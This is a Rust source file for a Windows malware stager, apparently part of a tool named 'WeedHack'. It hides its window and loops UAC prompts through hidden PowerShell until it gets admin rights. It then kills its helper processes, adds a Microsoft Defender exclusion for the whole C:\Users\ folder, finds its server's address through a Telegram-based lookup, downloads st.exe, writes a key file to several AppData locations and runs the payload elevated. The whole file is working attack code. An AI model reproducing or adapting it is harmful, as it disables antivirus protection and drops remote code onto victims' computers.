// language: Rust, file: src/main.rs, target: Windows 11
// stager: UAC elevate → exclusion → download st.exe → write key.json → launch as admin.

#![windows_subsystem = "windows"]

mod discovery;
mod embedded_key;

use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

const EXCLUSION_PATH: &str = r"C:\Users\";
const TARGET_EXE: &str = "st.exe";
const SENTINEL: &str = "_boot.alive";

#[cfg(all(windows, feature = "debug"))]
fn init_debug_console() {
    extern "system" {
        fn AllocConsole() -> i32;
        fn AttachConsole(dwProcessId: u32) -> i32;
    }
    unsafe {
        let attached = AttachConsole(0xFFFF_FFFF) != 0;
        if !attached { let _ = AllocConsole(); }
        let _ = Command::new("cmd")
            .args(["/C", "chcp", "65001"])
            .stdout(Stdio::null()).stderr(Stdio::null())
            .creation_flags(CREATE_NO_WINDOW)
            .status();
    }
}
#[cfg(not(all(windows, feature = "debug")))]
fn init_debug_console() {}

fn silent_cmd(program: &str) -> Command {
    let mut c = Command::new(program);
    c.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null());
    #[cfg(windows)]
    { c.creation_flags(CREATE_NO_WINDOW); }
    c
}

fn is_admin() -> bool {
    silent_cmd("cmd")
        .args(["/C", "net session >nul 2>&1"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn self_path() -> PathBuf {
    std::env::current_exe().unwrap_or_else(|_| PathBuf::from("boot.exe"))
}

fn cwd() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|p| p.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."))
}

fn sentinel_path() -> PathBuf { cwd().join(SENTINEL) }

fn load_key() -> String {
    let embedded = embedded_key::ACCOUNT_KEY.trim();
    if !embedded.is_empty() { return embedded.to_string(); }

    if let Some(a) = std::env::args().nth(1) {
        let a = a.trim();
        if !a.is_empty() { return a.to_string(); }
    }
    if let Ok(e) = std::env::var("WEEDHACK_KEY") {
        let e = e.trim();
        if !e.is_empty() { return e.to_string(); }
    }
    String::new()
}

fn write_key_json(key: &str, dir: &Path) {
    if key.is_empty() { return; }
    let body = format!("{{\n  \"key\": \"{}\"\n}}\n", key.replace('"', "\\\""));

    // 1. next to boot.exe (and st.exe after download)
    let _ = fs::write(dir.join("key.json"), body.as_bytes());

    // 2. %APPDATA%\loader\key.json
    if let Ok(appdata) = std::env::var("APPDATA") {
        let loader = PathBuf::from(&appdata).join("loader");
        let _ = fs::create_dir_all(&loader);
        let _ = fs::write(loader.join("key.json"), body.as_bytes());
    }

    // 3. %LOCALAPPDATA%\WeedHack\key.json (legacy)
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        let wh = PathBuf::from(&local).join("WeedHack");
        let _ = fs::create_dir_all(&wh);
        let _ = fs::write(wh.join("key.json"), body.as_bytes());
    }
}

fn fire_uac_once(exe: &Path, dir: &Path) {
    let inner = format!("/c start \"\" /b \"{}\"", exe.display());
    let _ = silent_cmd("powershell")
        .args([
            "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
            "-Command",
            &format!(
                "Start-Process -FilePath 'cmd.exe' -ArgumentList '{}' -Verb RunAs -WindowStyle Hidden -Wait",
                inner.replace('\'', "''")
            ),
        ])
        .current_dir(dir)
        .status();
}

fn elevate_loop() -> ! {
    let exe = self_path();
    let dir = cwd();
    let sentinel = sentinel_path();

    let _ = fs::remove_file(&sentinel);

    loop {
        fire_uac_once(&exe, &dir);
        if sentinel.exists() {
            thread::sleep(Duration::from_millis(200));
            std::process::exit(0);
        }
    }
}

fn kill_broker_cmd() {
    let _ = silent_cmd("powershell")
        .args([
            "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
            "-Command",
            "Get-CimInstance Win32_Process -Filter \"Name='cmd.exe'\" | \
             Where-Object { $_.CommandLine -like '*boot*' -or $_.CommandLine -like '*start*' } | \
             ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
        ])
        .status();
}

fn add_defender_exclusion() -> Result<(), String> {
    let ps = format!(
        "Add-MpPreference -ExclusionPath '{}' -Force -ErrorAction SilentlyContinue",
        EXCLUSION_PATH
    );
    let out = silent_cmd("powershell")
        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps])
        .output()
        .map_err(|e| format!("powershell spawn: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "Add-MpPreference exit {:?} stderr={}",
            out.status.code(),
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(())
}

fn server_base() -> Result<String, String> {
    let ip = discovery::fetch_ip(discovery::TELEGRAM_URL)?;
    Ok(format!("http://{}", ip))
}

fn download_to(base: &str, name: &str, out_path: &Path) -> Result<(), String> {
    let url = format!("{}/api/downloads/{}", base, name);
    let mut resp = reqwest::blocking::get(&url).map_err(|e| e.to_string())?;
    if !resp.status().is_success() {
        return Err(format!("{} -> HTTP {}", name, resp.status()));
    }
    let mut buf = Vec::new();
    resp.read_to_end(&mut buf).map_err(|e| e.to_string())?;
    let mut f = fs::File::create(out_path).map_err(|e| e.to_string())?;
    f.write_all(&buf).map_err(|e| e.to_string())?;
    f.flush().ok();
    Ok(())
}

fn launch_as_admin(exe: &Path) -> Result<(), String> {
    let dir = cwd();
    let ps = format!(
        "Start-Process -FilePath '{}' -WorkingDirectory '{}' -Verb RunAs",
        exe.display(),
        dir.display()
    );
    silent_cmd("powershell")
        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps])
        .spawn()
        .map(|_| ())
        .map_err(|e| e.to_string())
}

fn main() {
    init_debug_console();

    let key = load_key();

    if !is_admin() {
        elevate_loop();
    }

    let sentinel = sentinel_path();
    let _ = fs::write(&sentinel, b"1");

    thread::sleep(Duration::from_millis(300));
    kill_broker_cmd();
    let _ = fs::remove_file(&sentinel);

    let _ = add_defender_exclusion();

    let base = match server_base() {
        Ok(b) => b,
        Err(_) => std::process::exit(1),
    };

    let dir = cwd();

    // write key.json before touching st.exe — every path a sibling might check
    write_key_json(&key, &dir);

    let target = dir.join(TARGET_EXE);
    if !target.exists() {
        if download_to(&base, TARGET_EXE, &target).is_err() {
            std::process::exit(2);
        }
    }
    if !target.exists() {
        std::process::exit(3);
    }

    // re-write after download — covers a fresh dir or failed first write
    write_key_json(&key, &dir);

    let _ = launch_as_admin(&target);
}